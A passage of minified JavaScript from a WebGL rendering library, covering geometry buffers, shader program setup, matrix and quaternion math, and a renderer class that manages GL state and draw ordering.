                e.count = e.data.length / e.size,
                e.divisor = e.instanced ? "number" == typeof e.instanced ? e.instanced : 1 : 0,
                e.needsUpdate = !1,
                e.bufferMode = e.bufferMode || this.gl.STATIC_DRAW,
                this.updateAttribute(e),
                e.divisor) {
                if (this.isInstanced = !0,
                    this.instancedCount && this.instancedCount !== e.count * e.divisor)
                    return console.warn("geometry has multiple instanced buffers of different length"),
                        this.instancedCount = Math.min(this.instancedCount, e.count * e.divisor);
                this.instancedCount = e.count * e.divisor
            } else
                "index" === t ? this.drawRange.count = e.count : this.attributes.index || (this.drawRange.count = Math.max(this.drawRange.count, e.count))
        }
        updateAttribute(t) {
            this.glState.boundBuffer !== t.id && (this.gl.bindBuffer(t.target, t.buffer),
                this.glState.boundBuffer = t.id),
                this.gl.bufferData(t.target, t.data, t.bufferMode, 0, this.attrRange > 0 ? this.attrRange * t.size : this.instancedCount * t.size),
                t.needsUpdate = !1
        }
        setIndex(t) {
            this.addAttribute("index", t)
        }
        setDrawRange(t, e) {
            this.attrRange = e,
                this.drawRange.start = t,
                this.drawRange.count = e
        }
        setInstancedCount(t) {
            this.instancedCount = t
        }
        createVAO(t) {
            this.vao[t.id] = this.gl.renderer.createVertexArray(),
                this.gl.renderer.bindVertexArray(this.vao[t.id]),
                this.bindAttributes(t)
        }
        bindAttributes(t) {
            t.attributeLocations.forEach((t, e) => {
                if (!this.attributes[e])
                    return void console.warn(`active attribute ${e} not being supplied`);
                const s = this.attributes[e];
                if (this.gl.bindBuffer(this.gl.ARRAY_BUFFER, s.buffer),
                    this.glState.boundBuffer = s.id,
                    s.size > 4) {
                    const e = s.size / 4
                        , i = 4 * e
                        , n = 4 * i;
                    for (let s = 0; s < e; ++s)
                        this.gl.vertexAttribPointer(t + s, e, this.gl.FLOAT, !1, n, i * s),
                            this.gl.enableVertexAttribArray(t + s),
                            this.gl.renderer.vertexAttribDivisor(t + s, 1)
                } else
                    this.gl.vertexAttribPointer(t, s.size, s.type, s.normalize, 0, 0),
                        this.gl.enableVertexAttribArray(t),
                        this.gl.renderer.vertexAttribDivisor(t, s.divisor)
            }
            ),
                this.attributes.index && this.gl.bindBuffer(this.gl.ELEMENT_ARRAY_BUFFER, this.attributes.index.buffer)
        }
        draw({ program: t, mode: e = this.gl.TRIANGLES, geometryBound: s = !1 }) {
            s || (this.vao[t.id] || this.createVAO(t),
                this.gl.renderer.bindVertexArray(this.vao[t.id]),
                this.gl.renderer.currentGeometry = this.id),
                t.attributeLocations.forEach((t, e) => {
                    const s = this.attributes[e];
                    s.needsUpdate && this.updateAttribute(s)
                }
                ),
                this.isInstanced ? this.attributes.index ? this.gl.renderer.drawElementsInstanced(e, this.drawRange.count, this.attributes.index.type, this.drawRange.start, this.instancedCount) : this.gl.renderer.drawArraysInstanced(e, this.drawRange.start, this.drawRange.count, this.instancedCount) : this.attributes.index ? this.gl.drawElements(e, this.drawRange.count, this.attributes.index.type, this.drawRange.start) : this.gl.drawArrays(e, this.drawRange.start, this.drawRange.count)
        }
        computeBoundingBox() {
            yn(this.attributes.position.data, this.bounds.min, this.bounds.max, this.bounds.center, this.bounds.scale),
                this.bounds.initiated = !0
        }
        computeBoundingSphereRadius() {
            let t = 0;
            for (let e = 0, s = this.attributes.position.data.length; e < s; e += 3)
                fn[0] = this.attributes.position.data[e],
                    fn[1] = this.attributes.position.data[e + 1],
                    fn[2] = this.attributes.position.data[e + 2],
                    t = Math.max(t, an(this.bounds.center, fn));
            this.bounds.radius = Math.sqrt(t)
        }
        computeBoundingSphere() {
            this.bounds.initiated || this.computeBoundingBox(),
                this.computeBoundingSphereRadius()
        }
        remove() {
            this.vao && this.vao.forEach(t => {
                this.gl.renderer.deleteVertexArray(t)
            }
            );
            for (const t in this.attributes)
                this.gl.deleteBuffer(this.attributes[t].buffer),
                    delete this.attributes[t]
        }
    }
    let wn = 1;
    class xn {
        constructor(t, { vertex: e, fragment: s, uniforms: i = {}, instanced: n = {}, active: a = !0, transparent: r = !1, cullFace: o = t.BACK, frontFace: l = t.CCW, depthTest: c = !0, depthWrite: h = !0, depthFunc: d = t.LESS, globalUniforms: u = {} } = {}) {
            this.gl = t,
                this.uniforms = i,
                this.instanced = n,
                this.autoUniforms = [],
                this.id = wn++,
                this.active = a,
                e || console.warn("vertex shader not supplied"),
                s || console.warn("fragment shader not supplied"),
                this.transparent = r,
                this.cullFace = o,
                this.frontFace = l,
                this.depthTest = c,
                this.depthWrite = h,
                this.depthFunc = d,
                this.blendFunc = {},
                this.blendEquation = {},
                this.transparent && !this.blendFunc.src && (this.gl.renderer.premultipliedAlpha ? this.setBlendFunc(this.gl.ONE, this.gl.ONE_MINUS_SRC_ALPHA) : this.setBlendFunc(this.gl.SRC_ALPHA, this.gl.ONE_MINUS_SRC_ALPHA));
            const m = t.createShader(t.VERTEX_SHADER);
            t.shaderSource(m, e),
                t.compileShader(m);
            const p = t.createShader(t.FRAGMENT_SHADER);
            t.shaderSource(p, s),
                t.compileShader(p),
                this.program = t.createProgram(),
                t.attachShader(this.program, m),
                t.attachShader(this.program, p),
                t.linkProgram(this.program),
                t.deleteShader(m),
                t.deleteShader(p),
                this.uniformLocations = new Map;
            const f = t.getProgramParameter(this.program, t.ACTIVE_UNIFORMS);
            for (let e = 0; e < f; e++) {
                const s = t.getActiveUniform(this.program, e)
                    , i = t.getUniformLocation(this.program, s.name);
                i.cacheArray = [],
                    i.cacheValue = -0,
                    this.uniformLocations.set(s, i);
                const n = s.name.match(/(\w+)/g);
                s.uniformName = n[0];
                const a = s.uniformName;
                u[a] ? this.uniforms[a] || (this.uniforms[a] = u[a]) : this.uniforms[a] || (En.has(a) || this.autoUniforms.push(a),
                    this.uniforms[a] = {
                        value: void 0
                    })
            }
            this.attributeLocations = new Map;
            const g = t.getProgramParameter(this.program, t.ACTIVE_ATTRIBUTES);
            for (let e = 0; e < g; e++) {
                const s = t.getActiveAttrib(this.program, e);
                this.attributeLocations.set(s.name, t.getAttribLocation(this.program, s.name))
            }
        }
        setBlendFunc(t, e, s, i) {
            this.blendFunc.src = t,
                this.blendFunc.Jp = e,
                this.blendFunc.srcAlpha = s,
                this.blendFunc.dstAlpha = i,
                t && (this.transparent = !0)
        }
        setBlendEquation(t, e) {
            this.blendEquation.modeRGB = t,
                this.blendEquation.modeAlpha = e
        }
        applyState() {
            this.depthTest ? this.gl.renderer.enable(this.gl.DEPTH_TEST) : this.gl.renderer.disable(this.gl.DEPTH_TEST),
                this.cullFace ? this.gl.renderer.enable(this.gl.CULL_FACE) : this.gl.renderer.disable(this.gl.CULL_FACE),
                this.blendFunc.src ? this.gl.renderer.enable(this.gl.BLEND) : this.gl.renderer.disable(this.gl.BLEND),
                this.cullFace && this.gl.renderer.setCullFace(this.cullFace),
                this.gl.renderer.setFrontFace(this.frontFace),
                this.gl.renderer.setDepthMask(this.depthWrite),
                this.gl.renderer.setDepthFunc(this.depthFunc),
                this.blendFunc.src && this.gl.renderer.setBlendFunc(this.blendFunc.src, this.blendFunc.Jp, this.blendFunc.srcAlpha, this.blendFunc.dstAlpha),
                this.blendEquation.modeRGB && this.gl.renderer.setBlendEquation(this.blendEquation.modeRGB, this.blendEquation.modeAlpha)
        }
        use({ programActive: t = !1, flipFaces: e = !1, shadowTarget: s = null } = {}) {
            let i = -1;
            t || (this.gl.useProgram(this.program),
                this.gl.renderer.currentProgram = this.id),
                this.uniformLocations.forEach((t, e) => {
                    const n = e.uniformName
                        , a = this.uniforms[n];
                    let r = !1;
                    if (!s && a.state) {
                        if ((0 | t.state) >= a.state)
                            return;
                        r = !0,
                            t.state = a.state
                    }
                    if (35678 === e.type || 35682 === e.type) {
                        if (void 0 === a.value.length)
                            return i += 1,
                                a.value.update(i),
                                !r && !kn(t, i) || Sn(this.gl, e.type, t, i);
                        if (a.value.length > 0) {
                            const s = [];
                            for (let t = 0, e = a.value.length; t < e; ++t)
                                i += 1,
                                    a.value[t] && a.value[t].update(i),
                                    s.push(i);
                            return !r && !kn(t, s) || Sn(this.gl, e.type, t, s)
                        }
                    }
                    (r || kn(t, a.value)) && Sn(this.gl, e.type, t, a.value)
                }
                ),
                this.applyState(),
                e && this.gl.renderer.setFrontFace(this.frontFace === this.gl.CCW ? this.gl.CW : this.gl.CCW)
        }
        remove() {
            this.gl.deleteProgram(this.program),
                this.gl.deleteShader(this.vertexShader),
                this.gl.deleteShader(this.fragmentShader)
        }
    }
    function kn(t, e, s) {
        if (void 0 !== e.length) {
            if ($n(t.cacheArray, e))
                return !1
        } else {
            if (t.cacheValue === e)
                return !1;
            t.cacheValue = e
        }
        return !0
    }
    function $n(t, e) {
        let s = !0;
        const i = t.length
            , n = e.length;
        i !== n && (s = !1);
        for (let i = 0; i < n; i++)
            t[i] !== e[i] && (s = !1,
                t[i] = e[i]);
        return s
    }
    function Sn(t, e, s, i, n) {
        switch (e) {
            case 5126:
                return i.length ? t.uniform1fv(s, i) : t.uniform1f(s, i);
            case 35664:
                return t.uniform2fv(s, i);
            case 35665:
                return t.uniform3fv(s, i);
            case 35666:
                return t.uniform4fv(s, i);
            case 35670:
            case 5124:
            case 35678:
            case 35682:
            case 35680:
                return i.length ? t.uniform1iv(s, i) : t.uniform1i(s, i);
            case 35671:
            case 35667:
                return t.uniform2iv(s, i);
            case 35672:
            case 35668:
                return t.uniform3iv(s, i);
            case 35673:
            case 35669:
                return t.uniform4iv(s, i);
            case 35674:
                return t.uniformMatrix2fv(s, !1, i);
            case 35675:
                return t.uniformMatrix3fv(s, !1, i);
            case 35676:
                return t.uniformMatrix4fv(s, !1, i)
        }
    }
    const En = new Set(["kX", "WH", "Td", "jH", "Rg", "zR", "KD"]);
    function Mn() {
        return [1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1]
    }
    function _n(t, e) {
        return t[0] = e[0],
            t[1] = e[1],
            t[2] = e[2],
            t[3] = e[3],
            t[4] = e[4],
            t[5] = e[5],
            t[6] = e[6],
            t[7] = e[7],
            t[8] = e[8],
            t[9] = e[9],
            t[10] = e[10],
            t[11] = e[11],
            t[12] = e[12],
            t[13] = e[13],
            t[14] = e[14],
            t[15] = e[15],
            t
    }
    function Cn(t, e) {
        const s = e[0]
            , i = e[1]
            , n = e[2]
            , a = e[3]
            , r = e[4]
            , o = e[5]
            , l = e[6]
            , c = e[7]
            , h = e[8]
            , d = e[9]
            , u = e[10]
            , m = e[11]
            , p = e[12]
            , f = e[13]
            , g = e[14]
            , v = e[15]
            , y = s * o - i * r
            , b = s * l - n * r
            , w = s * c - a * r
            , x = i * l - n * o
            , k = i * c - a * o
            , $ = n * c - a * l
            , S = h * f - d * p
            , E = h * g - u * p
            , M = h * v - m * p
            , _ = d * g - u * f
            , C = d * v - m * f
            , T = u * v - m * g;
        let P = y * T - b * C + w * _ + x * M - k * E + $ * S;
        return P ? (P = 1 / P,
            t[0] = (o * T - l * C + c * _) * P,
            t[1] = (n * C - i * T - a * _) * P,
            t[2] = (f * $ - g * k + v * x) * P,
            t[3] = (u * k - d * $ - m * x) * P,
            t[4] = (l * M - r * T - c * E) * P,
            t[5] = (s * T - n * M + a * E) * P,
            t[6] = (g * w - p * $ - v * b) * P,
            t[7] = (h * $ - u * w + m * b) * P,
            t[8] = (r * C - o * M + c * S) * P,
            t[9] = (i * M - s * C - a * S) * P,
            t[10] = (p * k - f * w + v * y) * P,
            t[11] = (d * w - h * k - m * y) * P,
            t[12] = (o * E - r * _ - l * S) * P,
            t[13] = (s * _ - i * E + n * S) * P,
            t[14] = (f * b - p * x - g * y) * P,
            t[15] = (h * x - d * b + u * y) * P,
            t) : null
    }
    function Tn(t) {
        const e = t[0]
            , s = t[1]
            , i = t[2]
            , n = t[3]
            , a = t[4]
            , r = t[5]
            , o = t[6]
            , l = t[7]
            , c = t[8]
            , h = t[9]
            , d = t[10]
            , u = t[11]
            , m = t[12]
            , p = t[13]
            , f = t[14]
            , g = t[15];
        return (e * r - s * a) * (d * g - u * f) - (e * o - i * a) * (h * g - u * p) + (e * l - n * a) * (h * f - d * p) + (s * o - i * r) * (c * g - u * m) - (s * l - n * r) * (c * f - d * m) + (i * l - n * o) * (c * p - h * m)
    }
    function Pn(t, e, s) {
        const i = e[0]
            , n = e[1]
            , a = e[2]
            , r = e[3]
            , o = e[4]
            , l = e[5]
            , c = e[6]
            , h = e[7]
            , d = e[8]
            , u = e[9]
            , m = e[10]
            , p = e[11]
            , f = e[12]
            , g = e[13]
            , v = e[14]
            , y = e[15];
        let b = s[0]
            , w = s[1]
            , x = s[2]
            , k = s[3];
        return t[0] = b * i + w * o + x * d + k * f,
            t[1] = b * n + w * l + x * u + k * g,
            t[2] = b * a + w * c + x * m + k * v,
            t[3] = b * r + w * h + x * p + k * y,
            b = s[4],
            w = s[5],
            x = s[6],
            k = s[7],
            t[4] = b * i + w * o + x * d + k * f,
            t[5] = b * n + w * l + x * u + k * g,
            t[6] = b * a + w * c + x * m + k * v,
            t[7] = b * r + w * h + x * p + k * y,
            b = s[8],
            w = s[9],
            x = s[10],
            k = s[11],
            t[8] = b * i + w * o + x * d + k * f,
            t[9] = b * n + w * l + x * u + k * g,
            t[10] = b * a + w * c + x * m + k * v,
            t[11] = b * r + w * h + x * p + k * y,
            b = s[12],
            w = s[13],
            x = s[14],
            k = s[15],
            t[12] = b * i + w * o + x * d + k * f,
            t[13] = b * n + w * l + x * u + k * g,
            t[14] = b * a + w * c + x * m + k * v,
            t[15] = b * r + w * h + x * p + k * y,
            t
    }
    function In(t, e) {
        return t[0] = e[12],
            t[1] = e[13],
            t[2] = e[14],
            t
    }
    function Dn(t, e) {
        const s = e[0]
            , i = e[1]
            , n = e[2]
            , a = e[4]
            , r = e[5]
            , o = e[6]
            , l = e[8]
            , c = e[9]
            , h = e[10];
        return t[0] = Math.sqrt(s * s + i * i + n * n),
            t[1] = Math.sqrt(a * a + r * r + o * o),
            t[2] = Math.sqrt(l * l + c * c + h * h),
            t
    }
    function An(t) {
        const e = t[0]
            , s = t[1]
            , i = t[2]
            , n = t[4]
            , a = t[5]
            , r = t[6]
            , o = t[8]
            , l = t[9]
            , c = t[10]
            , h = e * e + s * s + i * i
            , d = n * n + a * a + r * r
            , u = o * o + l * l + c * c;
        return Math.sqrt(Math.max(h, d, u))
    }
    function Bn(t, e) {
        const s = e[0] + e[5] + e[10];
        let i = 0;
        return s > 0 ? (i = 2 * Math.sqrt(s + 1),
            t[3] = .25 * i,
            t[0] = (e[6] - e[9]) / i,
            t[1] = (e[8] - e[2]) / i,
            t[2] = (e[1] - e[4]) / i) : e[0] > e[5] && e[0] > e[10] ? (i = 2 * Math.sqrt(1 + e[0] - e[5] - e[10]),
                t[3] = (e[6] - e[9]) / i,
                t[0] = .25 * i,
                t[1] = (e[1] + e[4]) / i,
                t[2] = (e[8] + e[2]) / i) : e[5] > e[10] ? (i = 2 * Math.sqrt(1 + e[5] - e[0] - e[10]),
                    t[3] = (e[8] - e[2]) / i,
                    t[0] = (e[1] + e[4]) / i,
                    t[1] = .25 * i,
                    t[2] = (e[6] + e[9]) / i) : (i = 2 * Math.sqrt(1 + e[10] - e[0] - e[5]),
                        t[3] = (e[1] - e[4]) / i,
                        t[0] = (e[8] + e[2]) / i,
                        t[1] = (e[6] + e[9]) / i,
                        t[2] = .25 * i),
            t
    }
    function Rn(t, e, s, i) {
        const n = e[0]
            , a = e[1]
            , r = e[2]
            , o = e[3]
            , l = n + n
            , c = a + a
            , h = r + r
            , d = n * l
            , u = n * c
            , m = n * h
            , p = a * c
            , f = a * h
            , g = r * h
            , v = o * l
            , y = o * c
            , b = o * h
            , w = i[0]
            , x = i[1]
            , k = i[2];
        return t[0] = (1 - (p + g)) * w,
            t[1] = (u + b) * w,
            t[2] = (m - y) * w,
            t[3] = 0,
            t[4] = (u - b) * x,
            t[5] = (1 - (d + g)) * x,
            t[6] = (f + v) * x,
            t[7] = 0,
            t[8] = (m + y) * k,
            t[9] = (f - v) * k,
            t[10] = (1 - (d + p)) * k,
            t[11] = 0,
            t[12] = s[0],
            t[13] = s[1],
            t[14] = s[2],
            t[15] = 1,
            t
    }
    function zn(t, e) {
        const s = e[0]
            , i = e[1]
            , n = e[2]
            , a = e[3]
            , r = s + s
            , o = i + i
            , l = n + n
            , c = s * r
            , h = i * r
            , d = i * o
            , u = n * r
            , m = n * o
            , p = n * l
            , f = a * r
            , g = a * o
            , v = a * l;
        return t[0] = 1 - d - p,
            t[1] = h + v,
            t[2] = u - g,
            t[3] = 0,
            t[4] = h - v,
            t[5] = 1 - c - p,
            t[6] = m + f,
            t[7] = 0,
            t[8] = u + g,
            t[9] = m - f,
            t[10] = 1 - c - d,
            t[11] = 0,
            t[12] = 0,
            t[13] = 0,
            t[14] = 0,
            t[15] = 1,
            t
    }
    function Fn(t, e, s, i, n) {
        const a = 1 / Math.tan(e / 2)
            , r = 1 / (i - n);
        return t[0] = a / s,
            t[1] = 0,
            t[2] = 0,
            t[3] = 0,
            t[4] = 0,
            t[5] = a,
            t[6] = 0,
            t[7] = 0,
            t[8] = 0,
            t[9] = 0,
            t[10] = (n + i) * r,
            t[11] = -1,
            t[12] = 0,
            t[13] = 0,
            t[14] = 2 * n * i * r,
            t[15] = 0,
            t
    }
    function Zn(t, e, s, i, n, a, r) {
        const o = 1 / (e - s)
            , l = 1 / (i - n)
            , c = 1 / (a - r);
        return t[0] = -2 * o,
            t[1] = 0,
            t[2] = 0,
            t[3] = 0,
            t[4] = 0,
            t[5] = -2 * l,
            t[6] = 0,
            t[7] = 0,
            t[8] = 0,
            t[9] = 0,
            t[10] = 2 * c,
            t[11] = 0,
            t[12] = (e + s) * o,
            t[13] = (n + i) * l,
            t[14] = (r + a) * c,
            t[15] = 1,
            t
    }
    function Un(t, e, s, i) {
        const n = e[0]
            , a = e[1]
            , r = e[2]
            , o = i[0]
            , l = i[1]
            , c = i[2];
        let h = n - s[0]
            , d = a - s[1]
            , u = r - s[2]
            , m = h * h + d * d + u * u;
        m > 0 && (m = 1 / Math.sqrt(m),
            h *= m,
            d *= m,
            u *= m);
        let p = l * u - c * d
            , f = c * h - o * u
            , g = o * d - l * h;
        return m = p * p + f * f + g * g,
            m > 0 && (m = 1 / Math.sqrt(m),
                p *= m,
                f *= m,
                g *= m),
            t[0] = p,
            t[1] = f,
            t[2] = g,
            t[3] = 0,
            t[4] = d * g - u * f,
            t[5] = u * p - h * g,
            t[6] = h * f - d * p,
            t[7] = 0,
            t[8] = h,
            t[9] = d,
            t[10] = u,
            t[11] = 0,
            t[12] = n,
            t[13] = a,
            t[14] = r,
            t[15] = 1,
            t
    }
    function Ln(t, e) {
        return t[0] === e[0] && t[1] === e[1] && t[2] === e[2] && t[3] === e[3] && t[4] === e[4] && t[5] === e[5] && t[6] === e[6] && t[7] === e[7] && t[8] === e[8] && t[9] === e[9] && t[10] === e[10] && t[11] === e[11] && t[12] === e[12] && t[13] === e[13] && t[14] === e[14] && t[15] === e[15]
    }
    const Nn = [0, 0, 0];
    class On {
        constructor({ canvas: t = document.createElement("canvas"), width: e = 300, height: s = 150, dpr: i = 1, alpha: n = !1, LX: a = !0, stencil: r = !1, antialias: o = !1, premultipliedAlpha: l = !1, preserveDrawingBuffer: c = !1, powerPreference: h = "default", autoClear: d = !0, webgl: u = 2, resolution: m = 1 } = {}) {
            const p = {
                alpha: n,
                LX: a,
                stencil: r,
                antialias: o,
                premultipliedAlpha: l,
                preserveDrawingBuffer: c,
                powerPreference: h
            };
            this.dpr = i,
                this.alpha = n,
                this.color = !0,
                this.LX = a,
                this.stencil = r,
                this.premultipliedAlpha = l,
                this.autoClear = d,
                2 === u && (this.gl = t.getContext("webgl2", p)),
                this.isWebgl2 = !!this.gl,
                this.gl || (this.gl = t.getContext("webgl", p) || t.getContext("experimental-webgl", p)),
                this.canvas2dElement = document.createElement("canvas"),
                this.canvas2dContext = this.canvas2dElement.getContext("2d", {}),
                this.gl.renderer = this,
                this.setSize(e, s, m),
                this.parameters = {
                    maxTextureUnits: this.gl.getParameter(this.gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS)
                },
                this.state = {
                    blendFunc: {
                        src: this.gl.ONE,
                        Jp: this.gl.ZERO
                    },
                    blendEquation: {
                        modeRGB: this.gl.FUNC_ADD
                    },
                    cullFace: null,
                    frontFace: this.gl.CCW,
                    depthMask: !0,
                    depthFunc: this.gl.LESS,
                    premultiplyAlpha: !1,
                    flipY: !1,
                    framebuffer: null,
                    viewport: {
                        width: null,
                        height: null
                    },
                    textureUnits: [],
                    activeTextureUnit: 0
                },
                this.extensions = {},
                this.isWebgl2 || (this.getExtension("OES_texture_float"),
                    this.getExtension("OES_texture_float_linear"),
                    this.getExtension("OES_texture_half_float"),
                    this.getExtension("OES_element_index_uint"),
                    this.getExtension("OES_standard_derivatives"),
                    this.getExtension("EXT_sRGB"),
                    this.getExtension("WEBGL_depth_texture")),
                this.vertexAttribDivisor = this.gl.renderer.getExtension("ANGLE_instanced_arrays", "vertexAttribDivisor", "vertexAttribDivisorANGLE"),
                this.drawArraysInstanced = this.gl.renderer.getExtension("ANGLE_instanced_arrays", "drawArraysInstanced", "drawArraysInstancedANGLE"),
                this.drawElementsInstanced = this.gl.renderer.getExtension("ANGLE_instanced_arrays", "drawElementsInstanced", "drawElementsInstancedANGLE"),
                this.createVertexArray = this.gl.renderer.getExtension("OES_vertex_array_object", "createVertexArray", "createVertexArrayOES"),
                this.bindVertexArray = this.gl.renderer.getExtension("OES_vertex_array_object", "bindVertexArray", "bindVertexArrayOES"),
                this.deleteVertexArray = this.gl.renderer.getExtension("OES_vertex_array_object", "deleteVertexArray", "deleteVertexArrayOES")
        }
        setSize(t, e, s) {
            this.width = Math.round(t * s),
                this.height = Math.round(e * s),
                this.gl.canvas.width = this.width * this.dpr,
                this.gl.canvas.height = this.height * this.dpr,
                this.canvas2dElement.width = t * this.dpr,
                this.canvas2dElement.height = e * this.dpr
        }
        setViewport(t, e) {
            this.state.viewport.width === t && this.state.viewport.height === e || (this.state.viewport.width = t,
                this.state.viewport.height = e,
                this.gl.viewport(0, 0, t, e))
        }
        enable(t) {
            !0 !== this.state[t] && (this.gl.enable(t),
                this.state[t] = !0)
        }
        disable(t) {
            !1 !== this.state[t] && (this.gl.disable(t),
                this.state[t] = !1)
        }
        setBlendFunc(t, e, s, i) {
            this.state.blendFunc.src === t && this.state.blendFunc.Jp === e && this.state.blendFunc.srcAlpha === s && this.state.blendFunc.dstAlpha === i || (this.state.blendFunc.src = t,
                this.state.blendFunc.Jp = e,
                this.state.blendFunc.srcAlpha = s,
                this.state.blendFunc.dstAlpha = i,
                void 0 !== s ? this.gl.blendFuncSeparate(t, e, s, i) : this.gl.blendFunc(t, e))
        }
        setBlendEquation(t, e) {
            this.state.blendEquation.modeRGB === t && this.state.blendEquation.modeAlpha === e || (this.state.blendEquation.modeRGB = t,
                this.state.blendEquation.modeAlpha = e,
                void 0 !== e ? this.gl.blendEquationSeparate(t, e) : this.gl.blendEquation(t))
        }
        setCullFace(t) {
            this.state.cullFace !== t && (this.state.cullFace = t,
                this.gl.cullFace(t))
        }
        setFrontFace(t) {
            this.state.frontFace !== t && (this.state.frontFace = t,
                this.gl.frontFace(t))
        }
        setDepthMask(t) {
            this.state.depthMask !== t && (this.state.depthMask = t,
                this.gl.depthMask(t))
        }
        setDepthFunc(t) {
            this.state.depthFunc !== t && (this.state.depthFunc = t,
                this.gl.depthFunc(t))
        }
        activeTexture(t) {
            this.state.activeTextureUnit !== t && (this.state.activeTextureUnit = t,
                this.gl.activeTexture(this.gl.TEXTURE0 + t))
        }
        bindFramebuffer({ target: t = this.gl.FRAMEBUFFER, buffer: e = null } = {}) {
            this.state.framebuffer !== e && (this.state.framebuffer = e,
                this.gl.bindFramebuffer(t, e))
        }
        getExtension(t, e, s) {
            return e && this.gl[e] ? this.gl[e].bind(this.gl) : (this.extensions[t] || (this.extensions[t] = this.gl.getExtension(t)),
                e ? this.extensions[t][s].bind(this.extensions[t]) : this.extensions[t])
        }
        sortOpaque(t, e) {
            return t.renderOrder !== e.renderOrder ? t.renderOrder - e.renderOrder : t.program.id !== e.program.id ? t.program.id - e.program.id : t.zDepth !== e.zDepth ? t.zDepth - e.zDepth : e.id - t.id
        }
        sortTransparent(t, e) {
            return t.renderOrder !== e.renderOrder ? t.renderOrder - e.renderOrder : t.zDepth !== e.zDepth ? e.zDepth - t.zDepth : e.id - t.id
        }
        sortUI(t, e) {
            return t.renderOrder !== e.renderOrder ? t.renderOrder - e.renderOrder : t.program.id !== e.program.id ? t.program.id - e.program.id : e.id - t.id
        }
        getRenderList({ scene: t, camera: e, frustumCull: s, sort: i, shadowTarget: n }) {
            let a = [];
            e && s && e.updateFrustum();
            const r = [];
            if (t.traverse(t => {
                if (!t.visible)
                    return !0;
                if (t.draw && (!n || t.receiveShadow.has(n) || t.throwShadow.has(n))) {
                    if (s && t.frustumCulled && e && !e.frustumIntersectsMesh(t))
                        return !0;
                    if (t.group) {
                        if (r.indexOf(t.group) >= 0)
                            return;
                        r.push(t.group)
                    }
                    a.push(t)
                }
            }
            ),
                i) {
                const t = []
                    , s = []
                    , i = [];
                for (let n = 0, r = a.length; n < r; ++n) {
                    const r = a[n];
                    r.program.transparent ? r.program.depthTest ? s.push(r) : i.push(r) : t.push(r),
                        r.zDepth = 0,
                        0 === r.renderOrder && r.program.depthTest && e && (In(Nn, r.KP),
                            hn(Nn, Nn, e.kX),
                            r.zDepth = Nn[2])
                }
                t.sort(this.sortOpaque),
                    s.sort(this.sortTransparent),
                    i.sort(this.sortUI),
                    a = t.concat(s, i)
            }
            return a
        }
        render({ scene: t, camera: e, target: s = null, update: i = !0, sort: n = !0, frustumCull: a = !0, shadowTarget: r = !1, sceneCamera: o, clear: l = !0 }) {
            r && (s = r),
                null === s ? (this.bindFramebuffer(),
                    this.setViewport(this.width * this.dpr, this.height * this.dpr)) : (this.bindFramebuffer(s),
                        this.setViewport(s.width, s.height)),
                l && this.autoClear && (!this.LX || s && s.LX || (this.enable(this.gl.DEPTH_TEST),
                    this.setDepthMask(!0)),
                    this.gl.clear((this.color ? this.gl.COLOR_BUFFER_BIT : 0) | (this.LX ? this.gl.DEPTH_BUFFER_BIT : 0) | (this.stencil ? this.gl.STENCIL_BUFFER_BIT : 0))),
                i && t.needsFullUpdate && (t.updateMatrixWorld(!1),
                    t.needsFullUpdate = !1),
                e && null === e.parent && e.updateMatrixWorld(!1);
            const c = this.getRenderList({
                scene: t,
                camera: e,
                frustumCull: a,
                sort: n,
                shadowTarget: r
            });
            for (let t = 0, s = c.length; t < s; ++t)
                c[t].draw({
                    camera: e,
                    shadowTarget: r,
                    sceneCamera: o,
                    update: i
                })
        }
    }
    function jn(t, e) {
        return t[0] = Math.asin(-Math.min(Math.max(e[9], -1), 1)),
            Math.abs(e[9]) < .99999 ? (t[1] = Math.atan2(e[8], e[10]),
                t[2] = Math.atan2(e[1], e[5])) : (t[1] = Math.atan2(-e[2], e[0]),
                    t[2] = 0),
            t
    }
    function qn(t, e) {
        return t[0] = e[0],
            t[1] = e[1],
            t[2] = e[2],
            t[3] = e[3],
            t
    }
    function Xn(t, e, s, i, n) {
        return t[0] = e,
            t[1] = s,
            t[2] = i,
            t[3] = n,
            t
    }
    function Hn(t, e) {
        const s = e[0]
            , i = e[1]
            , n = e[2]
            , a = e[3];
        let r = s * s + i * i + n * n + a * a;
        return r > 0 && (r = 1 / Math.sqrt(r)),
            t[0] = s * r,
            t[1] = i * r,
            t[2] = n * r,
            t[3] = a * r,
            t
    }
    function Kn(t, e) {
        return t[0] === e[0] && t[1] === e[1] && t[2] === e[2] && t[3] === e[3]
    }
    function Wn(t, e, s) {
        s *= .5;
        const i = Math.sin(s);
        return t[0] = i * e[0],
            t[1] = i * e[1],
            t[2] = i * e[2],
            t[3] = Math.cos(s),
            t
    }
    function Yn(t, e) {
        const s = Math.sin(.5 * e[0])
            , i = Math.cos(.5 * e[0])
            , n = Math.sin(.5 * e[1])
            , a = Math.cos(.5 * e[1])
            , r = Math.sin(.5 * e[2])
            , o = Math.cos(.5 * e[2]);
        return t[0] = s * a * o + i * n * r,
            t[1] = i * n * o - s * a * r,
            t[2] = i * a * r - s * n * o,
            t[3] = i * a * o + s * n * r,
            t
    }
    const Vn = Hn
        , Gn = function () {
            const t = [0, 0, 0]
                , e = [1, 0, 0]
                , s = [0, 1, 0];
            return function (i, n, a) {
                const r = ln(n, a);
                return r < -.999999 ? (cn(t, e, n),
                    Wi(t) < 1e-6 && cn(t, s, n),
                    on(t, t),
                    Wn(i, t, Math.PI),
                    i) : r > .999999 ? (i[0] = 0,
                        i[1] = 0,
                        i[2] = 0,
                        i[3] = 1,
                        i) : (cn(t, n, a),
                            i[0] = t[0],
                            i[1] = t[1],
                            i[2] = t[2],
                            i[3] = 1 + r,
                            Vn(i, i))
            }
        }()
        , Qn = Mn();
    class Jn {
        constructor(t = {}) {
            this.parent = null,
                this.children = [],
                this.visible = !0,
                this.geometry = void 0,
                this.matrix = Mn(),
                this.KP = Mn(),
                this.matrixAutoUpdate = !0,
                this.worldMatrixNeedsUpdate = !1,
                this.rotationNeedsUpdate = !1,
                this.position = [0, 0, 0],
                this.scale = [1, 1, 1],
                this.quaternion = [-0, -0, -0, 1],
                this.rotation = [-0, -0, -0],
                this.data = t
        }
        reset() {
            this.data = {},
                this.geometry = void 0,
                this.visible = !0,
                Vi(this.position, 0, 0, 0),
                Vi(this.scale, 1, 1, 1),
                Vi(this.rotation, 0, 0, 0),
                this.updateRotation(!0),
                this.setParent(null, !0);
            for (let t = 0; t < this.children.length; ++t)
                this.children[t].setParent(null);
            this.children.length = 0
        }
        setParent(t, e = !0) {
